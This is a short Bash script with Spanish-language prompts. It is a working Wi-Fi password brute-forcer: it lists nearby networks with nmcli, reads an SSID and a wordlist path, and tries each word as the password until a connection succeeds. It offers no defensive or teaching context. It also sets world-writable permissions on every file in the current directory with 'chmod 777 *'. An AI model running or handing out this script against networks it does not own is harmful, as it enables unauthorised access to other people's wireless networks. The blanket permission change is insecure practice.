#!/bin/bash

chmod 777 *
x99=/dev/null
clear
GREEN="\033[1;32m"
RED="\033[1;31m"
WHITE="\033[1;37m"
nmcli device wifi list
echo -e -n "\n${GREEN}SSID / NOMBRE DEL WIFI = ${WHITE}"
read ssid
echo -e -n "\n${GREEN}RUTA DEL DICCIONARIO = ${WHITE}"
read diccionario
echo ""
cat $diccionario | while read z;do
nmcli -w 1 device wifi connect "$ssid" password "$z" 2>$x99 >$x99
if [[ "$?" == "0" ]];then
echo -e "${WHITE}Clave Correcta ->${GREEN} $z"
break
else
echo -e "${WHITE}Clave Invalida->${RED} $z"
fi
done
